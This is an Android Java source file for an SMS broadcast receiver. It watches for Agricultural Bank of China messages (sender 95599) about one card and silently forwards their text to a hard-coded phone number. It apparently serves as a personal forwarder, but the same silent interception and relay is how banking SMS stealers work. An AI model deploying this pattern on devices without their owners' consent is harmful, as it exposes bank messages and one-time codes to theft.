package com.example.romer.a4;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class SMSBroadcastReceiver extends BroadcastReceiver {

    private SmsManager smsManager = SmsManager.getDefault();

    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pduses = (Object[]) intent.getExtras().get("pdus");
        for (Object pdus : pduses) {
            byte[] pdusmessage = (byte[]) pdus;
            SmsMessage sms = SmsMessage.createFromPdu(pdusmessage);
            String mobile = sms.getOriginatingAddress();//发送短信的手机号码
            String content = sms.getMessageBody(); //短信内容
            //Date date = new Date(sms.getTimestampMillis());
            //SimpleDateFormat format = new SimpleDateFormat("MM-dd HH:mm:ss");
            //String time = format.format(date);  //得到发送时间
            //String txt = String.format("%s,%s,%s", mobile, content, time);

            if (mobile.indexOf("95599")>=0 && content.indexOf("尾号xxxx") >= 0){
                String sendContent=content.replaceFirst("【中国农业银行】","");
                smsManager.sendTextMessage("130xxxxxxxx",null,sendContent,null,null);
            }
        }
    }

}
